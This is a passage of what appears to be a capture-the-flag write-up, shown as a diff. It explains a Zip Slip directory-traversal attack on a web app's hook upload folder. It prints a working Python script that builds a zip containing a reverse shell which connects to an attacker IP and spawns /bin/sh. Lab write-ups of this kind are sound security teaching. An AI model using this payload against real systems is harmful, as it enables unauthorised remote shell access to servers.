@@ -187,4 +187,29 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
 ```
 * some important details include:
-* 
+  * the directory where the hooks are uploaded to `HOOKS_DIR  = os.path.join(BASE_DIR, "hooks")`
+  * we are told on the upload function page that hooks for the shell are allowed, and we infer that the hooks are stored and executed by the app
+  * we'll include a hook file in the form of a Python reverse shell script, and we'll put in the `/hooks` endpoint via an attack called Zip Slip
+    * Zip Slip attacks are where apps download user-supplied zip files and unzip them, but the zip file explicitly provides a directory traversal payload in the unzip path (e.g., `../../webshell.php` may place the `webshell.php` file directly on the web app root directory)
+* we'll use this script to create the malicious zip file with the JSON and Python script contents (code provided by EpisticalAnarchist):
+```Python
+#!/usr/bin/env python3
+from zipfile import ZipFile
+IP = "<IP>"
+PY_SHELL = f"""
+import socket,subprocess,os
+s=socket.socket()
+s.connect(("{IP}",443));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+subprocess.call(["/bin/sh","-i"])
+"""
+
+with ZipFile('malicious.zip', 'w') as z:
+    z.writestr("shell.json", """{"name":"exploit"}""")
+    z.writestr("../../hooks/shell.py", PY_SHELL)
+    print("Created archive with files:\n", "\n".join(z.namelist()))
+```
+* after creating the zip file and uploading, the reverse shell connection is activated
+* the flag is in the user's home directory
